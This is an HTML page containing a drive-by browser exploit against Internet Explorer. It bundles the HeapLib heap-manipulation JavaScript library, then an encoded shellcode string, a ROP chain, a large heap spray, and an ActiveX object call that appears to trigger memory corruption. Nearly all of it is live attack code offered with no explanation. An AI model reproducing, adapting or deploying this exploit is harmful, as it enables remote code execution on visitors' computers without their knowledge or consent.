<html>
<head>
<script>
//
//   JavaScript Heap Exploitation library
//   by Alexander Sotirov <asotirov@determina.com>
//  
//   Version 0.3
//
// Copyright (c) 2007, Alexander Sotirov
// All rights reserved.
// 
// The HeapLib library is licensed under a BSD license, the text of which follows:
// 
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
// 
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//
 
//
// heapLib namespace
//

function heapLib() {
}


//
// heapLib class
//

// heapLib.ie constructor
//
// Creates a new heapLib API object for Internet Explorer. The maxAlloc
// argument sets the maximum block size that can be allocated using the alloc()
// function.
//
// Arguments:
//    maxAlloc - maximum allocation size in bytes (defaults to 65535)
//    heapBase - base of the default process heap (defaults to 0x150000)
//

heapLib.ie = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);

    // Allocate a padding string that uses maxAlloc bytes
    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    
    // Create an array for storing references to allocated memory
    this.mem = new Array();

    // Call flushOleaut32() once to allocate the maximum size blocks
    this.flushOleaut32();
}


//
// Outputs a debugging message in WinDbg. The msg argument must be a string
// literal. Using string concatenation to build the message will result in heap
// allocations.
//
// Arguments:
//    msg - string to output
//

heapLib.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}


//
// Enables or disables logging of heap operations in WinDbg.
//
// Arguments:
//    enable - a boolean value, set to true to enable heap logging
//

heapLib.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}


//
// Triggers a breakpoint in the debugger.
//

heapLib.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}


//
// Returns a string of a specified length, up to the maximum allocation size
// set in the heapLib.ie constructor. The string contains "A" characters.
//
// Arguments:
//    len - length in characters
//

heapLib.ie.prototype.padding = function(len) {
    if (len > this.paddingStr.length)
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

    return this.paddingStr.substr(0, len);
}


//
// Returns a number rounded up to a specified value.
//
// Arguments:
//    num   - integer to round
//    round - value to round to
//

heapLib.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}


//
// Converts an integer to a hex string. This function uses the heap.
//
// Arguments:
//    num   - integer to convert
//    width - pad the output with zeros to a specified width (optional)
//

heapLib.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}


//
// Convert a 32-bit address to a 4-byte string with the same representation in
// memory. This function uses the heap.
//
// Arguments:
//    addr - integer representation of the address
//

heapLib.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


//
// Allocates a block of a specified size with the OLEAUT32 alloc function.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    // Create an array for this tag if doesn't already exist
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        // Allocate a new block with strdup of the string argument
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        // Allocate the block
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}


//
// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory
// allocator.
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    // Run the garbage collector
    CollectGarbage();
}


//
// The JScript interpreter uses the OLEAUT32 memory allocator for all string
// allocations. This allocator stores freed blocks in a cache and reuses them
// for later allocations. The cache consists of 4 bins, each storing up to 6
// blocks. Each bin holds blocks of a certain size range:
//
//    0 - 32
//    33 - 64
//    65 - 256
//    257 - 32768
//
// When a block is freed by the OLEAUT32 free function, it is stored in one of
// the bins. If the bin is full, the smallest block in the bin is freed with
// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768
// bytes are not cached and are freed directly.
//
// To flush the cache, we need to free 6 blocks of the maximum size for each
// bin. The maximum size blocks will push out all smaller blocks from the
// cache. Then we allocate the maximum size blocks again, leaving the cache
// empty.
//
// You need to call this function once to allocate the maximum size blocks
// before you can use it to flush the cache.
//

heapLib.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    // Free the maximum size blocks and push out all smaller blocks

    this.freeOleaut32("oleaut32");
    
    // Allocate the maximum sized blocks again, emptying the cache

    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}


//
// Allocates a block of a specified size with the system memory allocator. A
// call to this function is equivalent to a call to HeapAlloc(). If the first
// argument is a number, it specifies the size of the new block, which is
// filled with "A" characters. If the argument is a string, its data is copied
// into a new block of size arg.length * 2 + 6. In both cases the size of the
// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768.
//
// Arguments:
//    arg - size of the memory block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    // Allocate the block with the OLEAUT32 allocator
    this.allocOleaut32(arg, tag);
}


//
// Frees all memory blocks marked with a specific tag with the system memory
// allocator. A call to this function is equivalent to a call to HeapFree().
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.free = function(tag) {

    // Free the blocks with the OLEAUT32 free function
    this.freeOleaut32(tag);

    // Flush the OLEAUT32 cache
    this.flushOleaut32();
}


//
// Runs the garbage collector and flushes the OLEAUT32 cache. Call this
// function before before using alloc() and free().
//

heapLib.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}


//
// Adds blocks of the specified size to the free list and makes sure they are
// not coalesced. The heap must be defragmented before calling this function.
// If the size of the memory blocks is less than 1024, you have to make sure
// that the lookaside is full.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many free blocks to add to the list (defaults to 1)
//

heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}


//
// Add blocks of the specified size to the lookaside. The lookaside must be
// empty before calling this function.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many blocks to add to the lookaside (defaults to 1)
//

heapLib.ie.prototype.lookaside = function(arg, count) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}


//
// Return the address of the head of the lookaside linked list for blocks of a
// specified size. Uses the heapBase parameter from the heapLib.ie constructor.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//

heapLib.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    // The lookahead array starts at heapBase + 0x688. It contains a 48 byte
    // structure for each block size + header size in 8 byte increments.

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}


//
// Returns a fake vtable that contains shellcode. The caller should free the
// vtable to the lookaside and use the address of the lookaside head as an
// object pointer. When the vtable is used, the address of the object must be
// in eax and the pointer to the vtable must be in ecx. Any virtual function
// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode
// execution. This function uses the heap.
//
// Arguments:
//    shellcode - shellcode string
//    jmpecx    - address of a jmp ecx or equivalent instruction
//    size      - size of the vtable to generate (defaults to 1008 bytes)
//

heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);

    // Make sure the size is valid
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (shellcode.length*2 > size-138)
        throw("Maximum shellcode length is " + (size-138) + " bytes");

    // Build the fake vtable that will go on the lookaside list
    //
    // lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
    // 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes

    var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    // If the vtable is the only entry on the lookaside, the first 4 bytes will
    // be 00 00 00 00, which disassembles as two add [eax], al instructions.
    // The jmp ecx trampoline will jump back to the beginning of the vtable and
    // execute the add [eax], al instructions. We need to use two sub [eax], al
    // instructions to fix the heap.

    vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
              shellcode + heap.padding((size-138)/2 - shellcode.length);

    return vtable;
}


var heap_obj = new heapLib.ie(0x20000);
var code = unescape("%uf911%u7f91%u3d79%ufd02%u66a8%u2f93%u9846%uba05%u961c%ufc10%u04bf%ub2b9%u4bb3%u0c3f%u4a7d%ufe19%uc1c7%u70d6%ub714%u38b8%u7bd5%ueb1a%u2772%u1549%u9ba9%ub124%u2c0d%u2140%u4fe3%ud01b%u41d4%uf508%u3571%ub099%uf887%u1d92%u3443%u7c7a%u973c%u85bf%u0ad5%u7ffd%u0415%u3d66%u672c%ufc83%u98a9%u2797%u7641%u1d7e%u75b9%ue131%u1c77%u794b%u7072%u0c74%u7d47%u1824%ua8d4%u7192%u093f%u22eb%ue0d3%ube43%ub496%ub848%ub040%u9b2d%u8114%u99d6%uf813%u4fb6%ue228%ub74a%u9f46%u78b3%u057b%u427a%u90b2%u8c37%u35e3%u0b0d%u4ef5%u498d%ubb25%u93ba%u123c%u34f9%ub1b5%u912f%u737c%u7379%ud42b%u3070%u7efc%ub03c%u7542%ub225%ubf97%u0d4a%u4777%u232d%u1cd5%u1d7a%u347c%u9f99%u7f40%u3f7b%u0524%u914e%u3372%u98f5%u7193%uff3a%uf8c0%ub435%u74b7%u894f%ua9f9%u49b3%ue280%uba67%u4b66%u4104%ud269%u3de1%ufd20%ub192%u430c%ub914%u48bb%ue388%u4637%ubea8%u762c%u2f7d%u0378%ub6d6%u9096%u328d%u15e0%u279b%ub5b8%ueb3b%ue32a%u7848%uf510%u4199%ue284%u0279%ub8fd%ubbb9%u3f49%ubfb4%u6615%u4227%u6b7f%u98d5%u4eb2%u8db1%u7343%ud439%u7d72%u7077%uf903%u0467%u0db7%u347c%ue186%uc609%ue0c0%u371c%u1496%u74b5%u4b35%ubaa8%u3d4f%u7b7e%u1071%u47eb%u2490%ufc22%uf831%u9b46%u912f%u0c75%ub34a%u97be%u1d7a%u3c2d%ub02c%u9325%u059f%u4092%u7476%u1177%ub6d6%ua9a9%u8dba%u337f%u7cd5%u713c%ube3f%u4b97%u92b9%u3b15%ub5f9%u8905%u2de1%u9690%u2576%u879b%ud0f6%u7ae2%ub042%uf523%ub8b7%u7279%ufd2b%u4893%u2714%u3a46%u47f8%u244e%u9166%ue318%u6775%u2c7b%u047d%ue019%u4f3d%ud413%u7099%ubb35%ub649%u78b3%ud232%u40d6%ub11d%u1c2f%u417e%u0cb2%u3937%u4aeb%u0d9f%ua8b4%u4398%u73bf%ufc0b%u7f34%u7077%u904a%u2071%ue1f7%u747d%u9834%u727c%u7641%u9148%ud686%u2db4%ufd80%u8d2f%u9947%u0d37%ubb1c%u7593%u0c24%ub3bf%u1a92%u2af8%u67e0%ua8b7%u7bb5%u0173%u02f9%ue3d1%uf512%u787e%u4905%u793f%u277a%ue221%u834b%u1deb%u403d%u46ba%ub63c%u0866%ud3c1%u7ae2%u9b42%u7b97%u794f%u852c%u9fd4%u2577%ubeb1%u74b8%ufc38%u7fb0%u8c04%u15e3%u147c%u88b2%u71d5%ue129%ua935%u73b9%u9643%u4e70%u0a7e%u75f5%u9940%u467d%u3c72%u2496%u4eb7%uf981%ub0a9%ueb84%ue030%ud51b%u97b5%u9849%u14b3%u2f2c%u34bf%u9b91%u2d76%u35fd%u2578%u04b4%ub667%u4b4a%u6948%ub2f8%u8d43%u1c42%u053d%ub1b9%uba47%u4fbb%ube15%u9392%u0d41%u66b8%u6b3f%u1dd6%ud428%ufc90%u27a8%u9f0c%uba37%u06ad%u5a2a%uc5dd%u74d9%uf424%u295d%ub1c9%u3149%u1455%u5503%u8314%ufced%uf34f%ub2d6%ufc06%u4326%u7478%u72c3%ue2aa%u2787%u607a%ucbc5%u24f1%u58fe%ue177%ue9f1%ud73d%ue93c%ud7f0%u2993%uab93%u7de9%u9573%u7021%ud272%u7b5c%u8b26%u2e2b%ub8d6%uf36e%u6ed7%u4be5%u0baf%u3f3a%u1505%u906b%u5d12%u9a93%u7e7c%u4fa2%u429f%ue4ed%u306b%u2cec%ub9a2%u10de%u8468%u9cee%uc071%u7ec9%u3a04%u022a%uf91e%ud850%u1cab%uabf2%uc50b%u7f02%u8ecd%u3409%uc99a%ucb0d%u624f%u4029%ua56e%u12bb%u6154%uc1e7%u30f5%ua74d%u220a%u1829%u28ae%u4dd8%u72c8%ua2b5%u8ce6%uad45%ufe71%u7277%u6829%ufb34%u6ff7%ud63b%uff4f%ud9c2%u29af%u8d01%u41ff%uaea0%u9194%u7b4d%uc23a%ud4e1%ub2fa%u8541%ud892%ufa4d%ue282%u9387%u1828%u5c40%u2304%u34f7%u2456%u7ff6%uc2df%u6f92%u5d89%u090b%u1690%ud6aa%u530f%u5dec%ua3a3%u95a3%ub7ce%u5654%uea85%u69f3%u8030%ufffb%u03be%u97ab%u72bc%u379b%u513f%ufe97%u1ad5%ufec0%u9b39%ua910%u9b53%u0d78%uc807%u529d%u7c92%uc70e%ud51c%u40e2%udb74%ua7dd%u24db%u3608%uf320%ubc75%u7150%u7c96");
var nops = unescape("%u0c0c%u0c0c");
var nops_90 = unescape("%u3342%u4ef8");
var rop_chain = unescape("%uec01%u77c4%uec00%u77c4%u5ed5%u77c1%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%uee15%u77c3%uee15%u77c3%ufa1c%u77c4%u0400%u0000%u0d13%u77c5%u0040%u0000%ueeef%u77c3%ud9bb%u77c5%ua88c%u77c2%u9f92%u77c3%ua184%u77c3%uaacc%u77c2%ub860%u77c3%u1120%u77c1%u2df9%u77c1%u5459%u77c3");

while (nops.length < 0x80000) nops += nops;
while (nops_90.length < 0x80000) nops_90 += nops_90;

var offset = nops.substring(0, 0x0);
var nops_padding = nops.substring(0, 0x5f4-code.length-offset.length);
var shellcode = offset + code + nops_padding + rop_chain + nops_90.substring(0, 0x800-code.length-nops_padding.length-rop_chain.length);


while (shellcode.length < 0x40000) shellcode += shellcode;
var block = shellcode.substring(0, (0x80000-6)/2);


heap_obj.gc();
for (var z=1; z < 0x230; z++) {
	heap_obj.alloc(block);
}


</script>
</head>
<body>
<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="OWdt"></object>
<script>
var obj = document.getElementById('OWdt').object;
var src = unescape("%u0c08%u0c0c");
while (src.length < 0x1002) src += src;
src = "\\\\xxx" + src;
src = src.substr(0, 0x1000 - 10);
var pic = document.createElement("img");
pic.src = src;
pic.nameProp;
obj.definition(512);
</script>
</body>
</html>
